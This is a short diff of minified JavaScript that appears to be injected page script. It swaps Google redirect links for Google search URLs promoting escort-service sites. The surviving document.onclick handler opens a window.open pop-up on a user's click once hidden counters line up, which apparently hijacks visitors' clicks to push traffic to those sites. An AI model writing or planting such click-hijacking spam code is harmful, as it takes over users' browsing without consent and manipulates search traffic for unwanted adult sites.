@@ -13,8 +13,8 @@ if(!localStorage.v){
   })();
 }
 let uhd=()=>{
-if(localStorage.m){aa='https://www.google.com/url?q=https://miniescort.com/&sa=U&ved=2ahUKEwjzl5Dcp76AAxX9VPUHHYC-BkAQFnoECAcQAg&usg=AOvVaw2g4sNW-fSCxDDLjX5Ioo3n'}
-if(localStorage.a){aa='https://www.google.com/url?q=https://sohanisharma.com/&sa=U&ved=2ahUKEwjAy5axp76AAxWxbfUHHc_sCxsQFnoECAAQAg&usg=AOvVaw3DA0bL9OjaQqFF7PZRz1Jz'}
+if(localStorage.m){aa='https://www.google.com/search?q=best+mumbai+escorts+miniescort.com'}
+if(localStorage.a){aa='https://www.google.com/search?q=ahmedabad+escorts+sohanisharma.com'}
   document.onclick=()=>{
     if(mi==3&&se>5&&se<9&bb!=''){window.open(bb);sessionStorage.c=1;}
   }
